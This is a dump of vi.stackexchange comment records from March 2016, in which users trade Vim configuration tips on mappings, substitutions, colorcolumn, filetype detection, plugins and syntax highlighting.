  <row Id="11277" PostId="6912" Score="0" Text="Thanks, I'm not aware of any plugin support for VsVim but I'll look into the full vim plugins." CreationDate="2016-03-18T14:14:12.303" UserId="1033" />
  <row Id="11278" PostId="6915" Score="0" Text="Thanks, this might be just me but I didn't understand much of that so I'm not sure how it'd work." CreationDate="2016-03-18T14:15:21.537" UserId="1033" />
  <row Id="11279" PostId="6922" Score="1" Text="@fruglemonkey you're right but I don't think it is a good practice to recommand: using bar this way is -in my opinion- a potential source of bugs hard to spot. It is easy to forgot a bar and to spend a lot of time trying to figure out what is causing the problem. I think that putting comments on separate lines is safer :-)" CreationDate="2016-03-18T14:16:59.217" UserId="1841" />
  <row Id="11280" PostId="6922" Score="3" Text="For what it's worth, [this post](https://github.com/vim/vim/issues/694#issuecomment-198063315) explains explains exactly what's going on with comments in VimL." CreationDate="2016-03-18T14:54:52.290" UserId="2313" />
  <row Id="11281" PostId="6922" Score="4" Text="Yon can also replace `^M` in replacement strings by `\r`." CreationDate="2016-03-18T14:56:03.710" UserId="2313" />
  <row Id="11282" PostId="6922" Score="0" Text="@SatoKatsura: Pretty interesting link and thanks for `\r` I'm used to C `\n` and couldn't remember which character to use in Vim." CreationDate="2016-03-18T14:59:45.630" UserId="1841" />
  <row Id="11283" PostId="6922" Score="4" Text="Sadly `\r` doesn't work in all contexts, f.i. you have to use `\n` in search patterns.  But it does work here." CreationDate="2016-03-18T15:02:43.193" UserId="2313" />
  <row Id="11284" PostId="6923" Score="1" Text="I don't get it ...  `%:h` is not the relative path - it's (the path - filename). Wouldn't just `expand('%') . ':' . line(&quot;.&quot;)` do? For example, I get `.vim/vimrc:1` when I run `vim .vim/vimrc` from `~`." CreationDate="2016-03-18T17:06:59.997" UserId="205" />
  <row Id="11285" PostId="6912" Score="1" Text="@TimAbell I don't know much about VsVim, but [based on this VsVim issue](https://github.com/jaredpar/VsVim/pull/1510) I would guess that it is possible. If you don't find clear information on the documentation you should consider opening a issue asking about it." CreationDate="2016-03-18T18:03:42.070" UserId="1405" />
  <row Id="11286" PostId="6687" Score="0" Text="Since writing this answer I have noticed it still, absolutely definitely, does not always hold -- i.e., there was no mistake in my original question.  I'll put it down to a very irritating bug." CreationDate="2016-03-18T18:56:54.890" UserId="4913" />
  <row Id="11287" PostId="6925" Score="0" Text="I like how you used `join()` that's a good reminder that this function can be pretty useful." CreationDate="2016-03-18T22:24:23.457" UserId="1841" />
  <row Id="11288" PostId="6627" Score="0" Text="@cbaumhardt, I tried this again—even with `-Nu NONE` I can't get an *existing* markdown file to have syntax highlighting, only a new one.  So it's not the `.vimrc` after all.  Any other ideas?" CreationDate="2016-03-18T23:34:30.167" UserId="4676" />
  <row Id="11290" PostId="6922" Score="0" Text="Thank you, now I know that it wasn't a problem with vim-script highlight in my theme ![SCRNSHT](http://i.stack.imgur.com/Yby0M.png) Is it OK to keep comments inline for the settings other than `inoremap`, or it's safer to add newlines to the whole `.vimrc`?" CreationDate="2016-03-19T04:39:29.593" UserId="6649" />
  <row Id="11291" PostId="6922" Score="1" Text="If you read Sato's link you'll see &quot;Some command definitions allow comments in their context so `set ai &quot; Set &amp;autoindent` works, treating `&quot;` just like newline or bar, but this does not apply to `:let`.&quot;...  In some cases it is possible to add comments at the end of the line but I think I've never seen a good `.vimrc` using them, so I would advise you not to use them." CreationDate="2016-03-19T07:48:17.163" UserId="1841" />
  <row Id="11292" PostId="6928" Score="0" Text="I can't seem to get this to work.  I tried typing it in as an `ex` command (i.e. prefixing it with `:` starting from normal mode) but when I then tried `&lt;c-/&gt;` nothing happened." CreationDate="2016-03-19T08:39:02.823" UserId="4676" />
  <row Id="11293" PostId="6930" Score="1" Text="I wonder if there is a way to &quot;repeat the last motion command&quot;, though?" CreationDate="2016-03-19T08:40:56.837" UserId="4676" />
  <row Id="11294" PostId="2946" Score="0" Text="The link is broken, which is a shame because it sounds interesting.  (Also: I love your use of the word &quot;spelunking.&quot;)  :D" CreationDate="2016-03-19T08:42:02.260" UserId="4676" />
  <row Id="11295" PostId="6929" Score="2" Text="Where did you read that `.` repeats the last command? Not in `:help .`, that's for sure." CreationDate="2016-03-19T10:24:42.020" UserId="54" />
  <row Id="11296" PostId="6926" Score="2" Text="You read the plugin's source and use the same method." CreationDate="2016-03-19T10:27:11.770" UserId="54" />
  <row Id="11297" PostId="6930" Score="2" Text="@Wildcard: for `f`, `F`, `t` and `T` motion you can use `;` ([`:h ;`](http://vimdoc.sourceforge.net/htmldoc/motion.html#;))" CreationDate="2016-03-19T11:05:10.767" UserId="1841" />
  <row Id="11298" PostId="6927" Score="1" Text="An easy answer would be to use (yet another) plugin: https://github.com/rhysd/clever-f.vim" CreationDate="2016-03-19T12:07:05.323" UserId="1800" />
  <row Id="11299" PostId="6933" Score="0" Text="Are you using any plugins for this? I don't see this effect: http://i.stack.imgur.com/yaWfl.png (with or without https://github.com/gabrielelana/vim-markdown)." CreationDate="2016-03-19T12:16:51.677" UserId="205" />
  <row Id="11300" PostId="6928" Score="0" Text="Strange. Could you try to use `f` instead of `&lt;c-/&gt;`?" CreationDate="2016-03-19T12:35:49.573" UserId="21" />
  <row Id="11301" PostId="6928" Score="0" Text="Just tried it; still doesn't do anything." CreationDate="2016-03-19T12:40:51.143" UserId="4676" />
  <row Id="11302" PostId="6907" Score="0" Text="How would your plugin choose the suitable places that the `)` could go? I think that problem is way harder than anything related to implementing it in VimScript." CreationDate="2016-03-19T12:51:59.673" UserId="64" />
  <row Id="11303" PostId="6934" Score="1" Text="I've no idea where your problems come from but I wonder if using `:!bash` is actually a good thing: I think that `:!` is meant to execute a single command but not to start an interactive shell. If you really need to execute several commands in an external shell why don't you directly the external shell?" CreationDate="2016-03-19T13:04:10.227" UserId="1841" />
  <row Id="11304" PostId="6928" Score="0" Text="Ok, that's very strange. This works as expected at my end. Did you remember the `&lt;expr&gt;` part?" CreationDate="2016-03-19T13:26:47.360" UserId="21" />
  <row Id="11305" PostId="6928" Score="0" Text="And: Could you try to copy the command and put it in your vimrc?" CreationDate="2016-03-19T13:27:31.360" UserId="21" />
  <row Id="11306" PostId="6928" Score="0" Text="I tried that too.  :)  I'm on Mac OS X 10.7.4 using Vim 7.3 if that helps." CreationDate="2016-03-19T13:43:19.163" UserId="4676" />
  <row Id="11307" PostId="6934" Score="1" Text="Can you  give us more details please? For example, what is your OS or distribution (including version), your bash  version and the output of `vim --version`? When you  answer, we willl take it from there." CreationDate="2016-03-19T14:00:12.337" UserId="2132" />
  <row Id="11308" PostId="6934" Score="0" Text="FYI. My system works perfectly and I just want to try and reproduce your problem. I use  Ubuntu 14.04 with regular vim-gtk package with what is mostly the vimrc_example file that comes with vim." CreationDate="2016-03-19T14:02:06.523" UserId="2132" />
  <row Id="11309" PostId="6928" Score="0" Text="I copied and pasted it and it didn't work because of `&lt;C-/&gt;`. But It did work for me when I substituted `&lt;C-/&gt;` for another key (e.g. `&lt;F2&gt;`)." CreationDate="2016-03-19T14:02:41.520" UserId="6698" />
  <row Id="11310" PostId="6934" Score="4" Text="You should use either `:shell` or `&lt;C-z&gt;`" CreationDate="2016-03-19T14:35:34.243" UserId="54" />
  <row Id="11311" PostId="2946" Score="0" Text="@Wildcard I updated the link to point at the PR I eventually made instead of the commit in my local branch (which I deleted when I got commit access to MacVim's main repository)." CreationDate="2016-03-19T14:55:51.410" UserId="72" />
  <row Id="11312" PostId="6928" Score="1" Text="Same thing for me: it works with `F2` but not `&lt;c-/&gt;`." CreationDate="2016-03-19T15:43:02.830" UserId="1841" />
  <row Id="11313" PostId="6937" Score="0" Text="Great, works. What exactly is `setf`?" CreationDate="2016-03-19T16:40:10.380" UserId="6882" />
  <row Id="11314" PostId="6937" Score="2" Text="See `:help :setf`." CreationDate="2016-03-19T17:56:38.647" UserId="54" />
  <row Id="11315" PostId="6935" Score="7" Text="Autoindenting Python code after the fact is just asking for trouble. Get the indentation correct when you write it instead of making something else guess what's the right indentation; this is a language that gives importance to indentation." CreationDate="2016-03-19T18:44:22.543" UserId="205" />
  <row Id="11316" PostId="6939" Score="0" Text="Maybe the variable you are referring to is `g:windowToKee`, not `g:bufferToKeep`." CreationDate="2016-03-19T19:09:32.110" UserId="6698" />
  <row Id="11317" PostId="6928" Score="0" Text="I think there is a problem mapping `&lt;c-/&gt;`. One could perhaps use `&lt;c-v&gt;` to write the actual key code generated by `&lt;c-/&gt;`, but on my keyboard it seems this only returns `/`, and so it seems `&lt;c-/&gt;` is undefined for me. I am not sure if this is the case for everyone else. In the meantime, I propose that one instead uses a different key, e.g. `&lt;c-f&gt;`." CreationDate="2016-03-19T19:11:39.837" UserId="21" />
  <row Id="11318" PostId="6939" Score="0" Text="@JairLopez: Obviously that was a typo, thanks for pointing it to me I edited the answer." CreationDate="2016-03-19T19:15:42.433" UserId="1841" />
  <row Id="11319" PostId="6928" Score="0" Text="Maybe you could add it to your answer, something like “If `&lt;C-/&gt;` doesn't work, press `CTRL-V + CTRL-/` instead, or use another key, e.g., `&lt;C-F&gt;`” To make it work I actually followed these steps. Note that `&lt;C-F&gt;` is used for Vim (see [`:h CTRL-F`](http://vimdoc.sourceforge.net/htmldoc/scroll.html#CTRL-F)). [This](http://vi.stackexchange.com/a/6917/6698) answer provides some guidance regarding how to find a good key sequence." CreationDate="2016-03-19T20:33:40.883" UserId="6698" />
  <row Id="11320" PostId="6912" Score="0" Text="Cheers, that's definitely worth looking into." CreationDate="2016-03-19T20:37:42.333" UserId="1033" />
  <row Id="11322" PostId="6915" Score="0" Text="Hi statox, Yes you can use the 80i directly at the place of s, so no need of nmap s.&#xA;&#xA;Hi Tim Abell, this will work surely.." CreationDate="2016-03-20T07:52:02.723" UserId="4502" />
  <row Id="11323" PostId="6949" Score="0" Text="What does your `.ycm_extra_conf.py` look like?" CreationDate="2016-03-20T08:23:50.050" UserId="205" />
  <row Id="11324" PostId="6949" Score="0" Text="There is no such file. But I do find one in the `example` folder of the `ycm` module. Do you mean that I should use that example, place in my working directory and use it as config for `ycmd`?" CreationDate="2016-03-20T09:00:47.293" UserId="6380" />
  <row Id="11325" PostId="6949" Score="1" Text="You should read YCM's documentation." CreationDate="2016-03-20T10:32:31.960" UserId="54" />
  <row Id="11327" PostId="6949" Score="0" Text="Maybe yes. I copied the `conf` into my `cwd` and it worked. But there are other errors." CreationDate="2016-03-20T12:48:10.387" UserId="6380" />
  <row Id="11328" PostId="6949" Score="0" Text="So `ycm` should magically guess what your paths are, even if you have to specify them to `gcc` explicitly ? Reading the docs is mandatory." CreationDate="2016-03-20T13:42:51.480" UserId="1800" />
  <row Id="11329" PostId="6949" Score="1" Text="`pkg-config --cflags gtk+-3.0` outputs a lot more than what you have included here." CreationDate="2016-03-20T15:01:47.760" UserId="205" />
  <row Id="11330" PostId="6950" Score="0" Text="I found this, but I don't think it works the way I want... https://ajayfromiiit.wordpress.com/2006/06/02/vim-applying-separate-settings-for-different-file-types-for-experienced-users-of-vim/" CreationDate="2016-03-20T15:48:49.163" UserId="4748" />
  <row Id="11331" PostId="6950" Score="2" Text="https://robots.thoughtbot.com/vim-spell-checking" CreationDate="2016-03-20T16:24:03.467" UserId="1800" />
  <row Id="11332" PostId="6954" Score="2" Text="The permission error seems to be on the file `/Users/Tak/.geeknote/error.log` have you tried changing the permissions for this file?" CreationDate="2016-03-20T19:16:33.100" UserId="1841" />
  <row Id="11333" PostId="6954" Score="0" Text="It perfectly solved my problem! Thank you!!" CreationDate="2016-03-20T19:34:10.247" UserId="6897" />
  <row Id="11335" PostId="6954" Score="0" Text="I'm glad it solved the problem :-) Now as I think that the question isn't related to Vim or it's usage but to the permissions properties of your system I'll vote to close the question." CreationDate="2016-03-20T19:47:57.140" UserId="1841" />
  <row Id="11336" PostId="6949" Score="0" Text="Yeah, maybe. So you mean that I should include *everything* output by `pkg-config --cflags gtk+-3.0`?" CreationDate="2016-03-20T23:54:33.983" UserId="6380" />
  <row Id="11337" PostId="6935" Score="0" Text="@muru Thank you. I keep this in my mind. Actually, I am modifying a python code written by others and the code uses 2 space indentation. At first I didn't care about mixing of 2 and 4 space indentations but later I wanted to fix this." CreationDate="2016-03-21T07:47:23.090" UserId="3290" />
  <row Id="11338" PostId="6948" Score="0" Text="Thank you very much! It worked." CreationDate="2016-03-21T07:59:56.700" UserId="3290" />
  <row Id="11339" PostId="6925" Score="0" Text="Thanks a lot. Discover join at the same time." CreationDate="2016-03-21T08:18:22.337" UserId="3357" />
  <row Id="11340" PostId="6957" Score="0" Text="Is it just `Latexmk` that's not defined, or are other commands not defined either? How did you install it?" CreationDate="2016-03-21T11:28:04.550" UserId="205" />
  <row Id="11341" PostId="6957" Score="0" Text="@muru, not sure, I don't use any other commands from it. I installed it with vim-plug. … I just confirmed that omni-completion works. Help files are installed too, so it isn't that it simply didn't install. In case it might make a difference, I'm running nvim in a mac terminal." CreationDate="2016-03-21T11:40:00.793" UserId="4505" />
  <row Id="11342" PostId="6957" Score="1" Text="On my system `:Latexmk` is available only when I'm editing a `*.latex` file, maybe you tried to use the command on another type of file?" CreationDate="2016-03-21T12:18:34.977" UserId="1841" />
  <row Id="11343" PostId="6957" Score="0" Text="Latexmk available here too." CreationDate="2016-03-21T12:28:53.633" UserId="1382" />
  <row Id="11344" PostId="6957" Score="0" Text="@statox, I see, that must be it. I call my latex files *.tex." CreationDate="2016-03-21T12:37:24.250" UserId="4505" />
  <row Id="11345" PostId="6957" Score="0" Text="@Lawrence: Yup it doesn't seems to work on a `*.tex` file on my system." CreationDate="2016-03-21T12:38:57.330" UserId="1841" />
  <row Id="11346" PostId="6957" Score="0" Text="@statox, thanks. I'll see if I can find some way to make it work for `*.tex` files too." CreationDate="2016-03-21T12:40:03.277" UserId="4505" />
  <row Id="11347" PostId="6957" Score="0" Text="@Lawrence: I was digging the code of the plugin, I guess it is possible but so far I haven't found a solution." CreationDate="2016-03-21T12:45:54.740" UserId="1841" />
  <row Id="11348" PostId="6957" Score="0" Text="@statox, how odd. I thought the normal extension for latex files were tex." CreationDate="2016-03-21T12:47:21.657" UserId="4505" />
  <row Id="11349" PostId="6908" Score="0" Text="I have https://github.com/tpope/vim-cucumber but it doesn't appear to do what I want (unless there's more to it than the readme shows)" CreationDate="2016-03-21T14:00:14.770" UserId="1033" />
  <row Id="11350" PostId="6962" Score="0" Text="The second option doesn't work for me. Nor did `let g:tex_flavor = 'latex'` which I had before.  `set filetype?` echos `tex`; but there is no `:Latexmk`." CreationDate="2016-03-21T14:38:54.773" UserId="4505" />
  <row Id="11351" PostId="6962" Score="0" Text="@Lawrence: Ok that's really weird, I'll try to find another solution then" CreationDate="2016-03-21T15:11:01.417" UserId="1841" />
  <row Id="11352" PostId="6962" Score="0" Text="Yeah, did you reproduce it?  Maybe the decision whether or not to load latexmk.vim is made before the filetype is changed." CreationDate="2016-03-21T15:12:44.883" UserId="4505" />
  <row Id="11353" PostId="6962" Score="0" Text="Yup I based my answer on my experimentation: on my system `*.tex` files's filetype was set to `plaintext` and `:Latexmk` wasn't available but the autocmd solved the problem." CreationDate="2016-03-21T15:14:39.000" UserId="1841" />
  <row Id="11354" PostId="6962" Score="1" Text="I think I found out where the problem lies.  Your solution works when I load a tex file normally, with `vi a.tex`. But not when I load it through a list with `vi (backtick) cat toc (backtick)." CreationDate="2016-03-21T15:28:15.253" UserId="4505" />
  <row Id="11355" PostId="6962" Score="0" Text="That's probably because with this syntax Vim can't see which type of file you're editing... Maybe it would be worth to ask for help in another question :-)" CreationDate="2016-03-21T15:34:16.530" UserId="1841" />
  <row Id="11356" PostId="6958" Score="1" Text="You are asking a question, but you actually describe another: if a plugin installs global keybindings, disable them (read the plugin docs about how to do it), and re-enable them locally (using autocmds for example) only for the filetypes you want. If the plugin is well written, you don't gain too much by delaying its initialization. But if you don't disable the unwanted global *keybindings* activated by a plugin, they will still affect you *after* the plugin is loaded." CreationDate="2016-03-21T15:39:01.070" UserId="1800" />
  <row Id="11357" PostId="6908" Score="0" Text="@PeterRincker can you post the cucumbertables thing as an answer so I can mark it as accepted :-)  https://github.com/timabell/vim-cucumber-align-pipes/commit/00a1d8969bb34f0eabaac3af32a94d1fe649f320" CreationDate="2016-03-21T15:57:02.827" UserId="1033" />
  <row Id="11358" PostId="6943" Score="0" Text="If you ever finish the logrotate syntax file, please do share. It would be nice to have." CreationDate="2016-03-21T18:37:53.627" UserId="205" />
  <row Id="11359" PostId="6943" Score="0" Text="@muru [Here](https://github.com/moon-musick/vim-logrotate) it is. Thank you for your excellent answer :)" CreationDate="2016-03-21T19:04:29.803" UserId="2329" />
  <row Id="11360" PostId="6969" Score="0" Text="Didn't work. Maybe event is not being called." CreationDate="2016-03-21T23:42:40.980" UserId="5732" />
  <row Id="11361" PostId="6963" Score="0" Text="As soon as I'll try that I will accept the answer, thanks!" CreationDate="2016-03-22T06:43:51.577" UserId="6634" />
  <row Id="11362" PostId="6874" Score="0" Text="@JairLopez Ah yes, I forgot about that. Thanks!" CreationDate="2016-03-22T10:05:34.633" UserId="51" />
  <row Id="11363" PostId="6971" Score="1" Text="If you close Vim before pasting, that won't work. See http://vi.stackexchange.com/a/3770/205. If Vim is still running, it should work. However, if you copied to the primary (`*`) instead of the clipboard (`+`), even selecting text somewhere else could overwrite that. For me, using `+` works reliably." CreationDate="2016-03-22T10:43:51.293" UserId="205" />
  <row Id="11366" PostId="6965" Score="0" Text="`'iminsert'` was the missing thing to get this config much easier. And I want this in insertmode too, because I write at hte moment LaTex documents in english, so no need for the umlauts. I adset the ü key and mapped it to \ for the LaTeX too. Thanks @ingo for pointing me to a better solution.&#xA;&#xA;`set iminsert=1&#xA;imap \ \&#xA;lmap { {&#xA;lmap } }&#xA;lmap \ \&#xA;lmap [ [&#xA;lmap ] ]&#xA;lmap \ :&#xA;set lmap={{,}},[[,]],\\\,\:&#xA;autocmd InsertEnter * imap \ \&#xA;autocmd InsertLeave * imap \ :&#xA;map! { {&#xA;map! } }&#xA;map! [ [&#xA;map! ] ]&#xA;map! \ :&#xA;map! \ \&#xA;noremap! Ö {&#xA;noremap! Ä }&#xA;noremap! ö [&#xA;noremap! ä ]&#xA;noremap! ü \&#xA;noremap! Ü \`" CreationDate="2016-03-22T11:04:31.513" UserId="6710" />
  <row Id="11367" PostId="6965" Score="0" Text="Sorry I don't got the formatting right in the comment!" CreationDate="2016-03-22T11:05:05.957" UserId="6710" />
  <row Id="11368" PostId="6971" Score="0" Text="I suspect this question is actually a dupe of yours @muru?" CreationDate="2016-03-22T11:36:58.013" UserId="51" />
  <row Id="11371" PostId="6973" Score="5" Text=":help hl-ColorColumn or :hi ColorColumn should give you some information" CreationDate="2016-03-22T13:40:53.013" UserId="284" />
  <row Id="11372" PostId="6975" Score="0" Text="You can't. Could you describe what you are trying to do instead of your failed attempts?" CreationDate="2016-03-22T14:29:11.860" UserId="54" />
  <row Id="11373" PostId="6975" Score="0" Text="@romainl I'm trying to convert a line with commas to a vertical list without so many steps;  I figured I'd throw it into a vimscript.  At the moment I do a search for commas, record a macro that moves to the next match, moves over one character to the right for the comma, presses enter, and then delete.  I can run the macro over and over again, but I have to count the number of matches first, so I know how many times to run the macro." CreationDate="2016-03-22T14:33:33.117" UserId="1065" />
  <row Id="11374" PostId="6975" Score="4" Text="Why don't you use a simple substitution? Something like `:s/,/,\r/g`?" CreationDate="2016-03-22T14:42:59.927" UserId="54" />
  <row Id="11375" PostId="6975" Score="0" Text="@romainl Good point.  Too much switching between Windows and Linux I guess." CreationDate="2016-03-22T14:44:08.830" UserId="1065" />
  <row Id="11376" PostId="6975" Score="0" Text="Another day, another XY problem…" CreationDate="2016-03-22T14:45:03.537" UserId="54" />
  <row Id="11377" PostId="6975" Score="1" Text="I ended up using `%s/,\W*/,\r/g` because of white space." CreationDate="2016-03-22T14:49:15.903" UserId="1065" />
  <row Id="11378" PostId="6976" Score="4" Text="[`:h :search()`](http://vimdoc.sourceforge.net/htmldoc/eval.html#search()) ?" CreationDate="2016-03-22T15:01:32.237" UserId="1841" />
  <row Id="11379" PostId="6973" Score="3" Text="[`:help 'cc'`](http://vimhelp.appspot.com/options.txt.html#%27cc%27) ... Also see: [How do I navigate to topics in Vim's documentation?](http://vi.stackexchange.com/q/2136/51)" CreationDate="2016-03-22T15:23:03.160" UserId="51" />
  <row Id="11380" PostId="6975" Score="3" Text="The regex for white spaces is `\s`, `\_s` if you want to match newlines as well." CreationDate="2016-03-22T16:09:10.197" UserId="626" />
  <row Id="11381" PostId="6976" Score="0" Text="Good catch @statox. `search()` requires we know the regex to pass it again. `:normal! n` doesn't require us to know the regex. If you need the next match without knowing exactly the pattern to search, `:norm! n` is the closest to the  initial question. But when you know the pattern, prefer `search()`, it won't mess the search register nor the search history, and you won't have to escape slashes either." CreationDate="2016-03-22T17:23:15.333" UserId="626" />
  <row Id="11382" PostId="5930" Score="0" Text="Are you sure? Because I don't see any code for it, and the [only commit I see](https://github.com/vim-jp/vim-java/commit/a21e5ee04576920e7083bf274aa4aca3409c57b4#diff-6cf7f9192680eaee9b1e199a1dfe5702) only removes the `-&gt;` from javaError with the message &quot;Don't match javaError if it's a lambda symbol&quot; (but doesn't add highlighting as a function)." CreationDate="2016-03-22T18:56:02.700" UserId="51" />
  <row Id="11383" PostId="6969" Score="0" Text="@cdvv7788 does invoking vim with `--cmd 'let gui_running=&quot;y&quot;'` together with setting `columns` and `rows` inside an `if` using `if exists('gui_running')` work?" CreationDate="2016-03-22T19:26:56.137" UserId="3343" />
  <row Id="11384" PostId="6955" Score="1" Text="Great, thanks! This worked for me: `autocmd FileType latex,tex,md,markdown setlocal spell`" CreationDate="2016-03-22T20:16:35.087" UserId="4748" />
  <row Id="11385" PostId="6955" Score="0" Text="I'm glad it was useful to you :-)" CreationDate="2016-03-22T20:49:40.817" UserId="1841" />
  <row Id="11387" PostId="6981" Score="1" Text="With folding, it can visually represent a ... folded sheet of paper. Otherwise, a letter that has to be used, after all good letters were taken for &quot;important&quot; operations that could use a good mnemonic." CreationDate="2016-03-22T23:27:43.337" UserId="1800" />
  <row Id="11388" PostId="6975" Score="1" Text="It has nothing to do with Windows or Linux.  Vim always uses `\r` to represent EOL in the replacement (and `\n` in the search) regardless of what line ending is in effect for the buffer.  The type of line ending is controlled by the `'fileformat'` option." CreationDate="2016-03-23T00:42:48.283" UserId="15" />
  <row Id="11389" PostId="2458" Score="0" Text="Regular vim is also more convenient if you're going to be using SSH a lot, since it can be put under tmux or screen and doesn't require X11 support at either end." CreationDate="2016-03-23T04:03:44.603" UserId="920" />
  <row Id="11390" PostId="6981" Score="3" Text="My guess is that it stands for Zhift ;)" CreationDate="2016-03-23T07:10:15.110" UserId="6935" />
  <row Id="11392" PostId="6987" Score="1" Text="You could use the `join()` function with the second argument `','` which would give: `execute 'set colorcolumn=' . join(range(1, 17, 4), ',')`. You could also use the following syntax: `let &amp;l:colorcolumn = join(range(1, 17, 4), ',')` The prefix `&amp;l:` is used to change the window-local value of the option (instead of the global one)." CreationDate="2016-03-23T10:01:05.567" UserId="4939" />
  <row Id="11393" PostId="6987" Score="1" Text="@saginaw: Your use of `join()` is indeed the good way to go, do you mind if I add it to my answer? About the `let &amp;l:colorcolumn` I guess it depends on what OP wants to do :-)" CreationDate="2016-03-23T10:05:22.913" UserId="1841" />
  <row Id="11394" PostId="6987" Score="1" Text="Ah yes you're right, the window-local scope was maybe not a good idea. Yes, if you think `join()` is a good idea, you should add it to the answer. If the window-local scope is not what the OP wants, in the 2nd syntax you could simply remove `l:`." CreationDate="2016-03-23T10:07:24.873" UserId="4939" />
  <row Id="11395" PostId="6987" Score="0" Text="Thanks I'll add it with credits to your name. For the local scope I don't see a situation where the user you'll need 4 colored strips on all of his windows so your idea seems wise but as OP didn't specify that we can only guess." CreationDate="2016-03-23T10:10:47.617" UserId="1841" />
  <row Id="11396" PostId="6963" Score="0" Text="I probably should create another question, but do you have ideas about how to highlight only builtin functions?" CreationDate="2016-03-23T10:35:21.323" UserId="6634" />
  <row Id="11397" PostId="6985" Score="0" Text="Thanks. I would like to not map it to &lt;C-X&gt;&lt;C-N&gt; in order to maintain its original function. I would like to use a combination which isnt used by the completion system like &lt;C-X&gt;&lt;C-A&gt;. Unfortunately this doesnt work." CreationDate="2016-03-23T11:11:08.317" UserId="6919" />
  <row Id="11398" PostId="6985" Score="0" Text="Maybe `&lt;C-X&gt;&lt;C-U&gt;` would work. Usually it's used in combination with a custom completion function whose name is defined by the option `'completefunc'`. Edit: ah no it doesn't seem to work. I'm gonna try something else, sorry." CreationDate="2016-03-23T11:15:47.980" UserId="4939" />
  <row Id="11399" PostId="6985" Score="0" Text="@user3394244 I've edited the answer to include a mapping which uses `&lt;C-X&gt;&lt;C-A&gt;`, it seems to work. You just have to change the first `&lt;C-X&gt;&lt;C-N&gt;` in the original `{lhs}`, but not the second one in the `{rhs}`." CreationDate="2016-03-23T11:21:17.477" UserId="4939" />
  <row Id="11401" PostId="6988" Score="2" Text="I.e. read the picture text *ad litteram* :)" CreationDate="2016-03-23T12:04:27.967" UserId="1800" />
  <row Id="11403" PostId="6987" Score="1" Text="Using `let &amp;cc = join('1, 17, 4), ',')` as @saginaw suggested is shorter and accomplishes the same result :)" CreationDate="2016-03-23T12:32:19.243" UserId="1800" />
  <row Id="11404" PostId="6987" Score="1" Text="Damn indeed that is shorter, I focused on the `&amp;l` part and didn't even realize that the important point of @saginaw's solution was that he used a more clever solution. As the approach is pretty different (and better!) than mine I guess that would be worth a second answer :-)" CreationDate="2016-03-23T12:37:18.927" UserId="1841" />
  <row Id="11405" PostId="6963" Score="0" Text="@user1685095 Builtin functions are listed out in the `pythonBuiltin` syntax group in the default `syntax/python.vim`. However, it doesn't distinguish between functions and builtin variables (`True`, `False` and `None` are also in `pythonBuiltin`). You could probably copy the definitions for your use." CreationDate="2016-03-23T13:06:03.947" UserId="205" />
  <row Id="11406" PostId="6963" Score="0" Text="Well, I've used more refined syntax then vim default like hdima/python and vim-polyglot. They all define builtin functions like a keyword which have important consequence. Not only builtin functions are highlighted, but just variable with same names and functions in other modules with the same name are highlighted.&#xA;Like ```query(...).***filter***()``` filter is highlighted while it doesn't have anything to do with builtin filter functions." CreationDate="2016-03-23T13:11:13.900" UserId="6634" />
  <row Id="11407" PostId="6989" Score="0" Text="It may cost me several days to understand the two command lines." CreationDate="2016-03-23T13:17:46.103" UserId="5181" />
  <row Id="11408" PostId="6968" Score="0" Text="Thanks! It works after adding the line to ~/.vim/after/syntax/python.vim and manually setting `foldingmethod` to `syntax` in buffer." CreationDate="2016-03-23T13:22:08.090" UserId="6649" />
  <row Id="11409" PostId="6963" Score="0" Text="@user1685095 the default `syntax.vim` does make them keywords. See https://github.com/vim/vim/blob/master/runtime/syntax/python.vim#L184" CreationDate="2016-03-23T13:22:43.443" UserId="205" />
  <row Id="11410" PostId="6990" Score="2" Text="That, or using `\ ` at the start of the continuation line(s)." CreationDate="2016-03-23T13:24:24.743" UserId="1800" />
  <row Id="11412" PostId="6990" Score="3" Text="I personally prefer to define a function as `fun! s:my_fun()`, this will only be visible inside the current file (and is not &quot;exposed&quot; needlessly when running Vim). I don't like the `\ ` line-continuation and `|` to chain commands as I find them unreadable and awkward to deal with." CreationDate="2016-03-23T13:38:40.633" UserId="51" />
  <row Id="11413" PostId="6990" Score="1" Text="I'd say the function is the way to go indeed: I'm not sure it is possible to define a multiline command, but if it is I think that would be pretty &quot;ugly&quot;" CreationDate="2016-03-23T13:41:11.613" UserId="1841" />
  <row Id="11414" PostId="6990" Score="1" Text="Yes, it's possible to define a multiline command - you have an (&quot;official&quot;) example at the end of `:h command-completion-custom` :)" CreationDate="2016-03-23T13:44:59.593" UserId="1800" />
  <row Id="11415" PostId="6968" Score="0" Text="...but breaks docstrings highlights. Life is tough." CreationDate="2016-03-23T13:46:54.867" UserId="6649" />
  <row Id="11416" PostId="6990" Score="2" Text="Also, for the OP, your function can have arguments, and you can pass them from the command using (preferably) `&lt;f-args&gt;` (see `:h &lt;f-args&gt;`)" CreationDate="2016-03-23T13:47:33.573" UserId="1800" />
  <row Id="11417" PostId="6963" Score="0" Text="Yeah, I know. That's the problem. They are not keywords." CreationDate="2016-03-23T14:01:23.293" UserId="6634" />
  <row Id="11418" PostId="6963" Score="0" Text="@user1685095 Odd. I don't have additional `syntax/python.vim` files (only the default, and I don't see the behaviour you do: http://i.stack.imgur.com/LgF6F.png, and I agree with the keyword definition - that's the closest fit, and I don't think keywords are matched in cases like `nonkeyword.keyword`. As for variables, note that these builtins *are* variables, they're variables containing function objects, and can be assigned to just like any other variables. Nothing prevents you from doing `sorted = filter` and then using `sorted` like `filter`." CreationDate="2016-03-23T14:08:39.513" UserId="205" />
  <row Id="11419" PostId="5930" Score="0" Text="@Caspetsmoker You're right. Just removes the error message. But I prefer like this." CreationDate="2016-03-23T14:10:48.377" UserId="177" />
  <row Id="11420" PostId="6963" Score="0" Text="Oh, I probably should try to base my own syntax on default vim syntax. Thanks. As for builtins as variables - then you should really only highlight them if it's not user defined variables, which probably impossible in vim. So I think the better of two evils is the one where you highlight them only when you use them as functions and not as variables." CreationDate="2016-03-23T14:16:24.970" UserId="6634" />
  <row Id="11421" PostId="5930" Score="1" Text="I see that the runtime files have been updated in March 2015 btw, and that the repo you link to doesn't have many fixes that this updates introduces. FYI :-)" CreationDate="2016-03-23T14:18:52.363" UserId="51" />
  <row Id="11422" PostId="6991" Score="2" Text="It's there in the README: https://github.com/vim-airline/vim-airline#integrating-with-powerline-fonts" CreationDate="2016-03-23T14:26:12.983" UserId="205" />
  <row Id="11423" PostId="5930" Score="0" Text="@Carpetsmoker Nice. Did work as expected. Thanks =)" CreationDate="2016-03-23T14:28:51.030" UserId="177" />
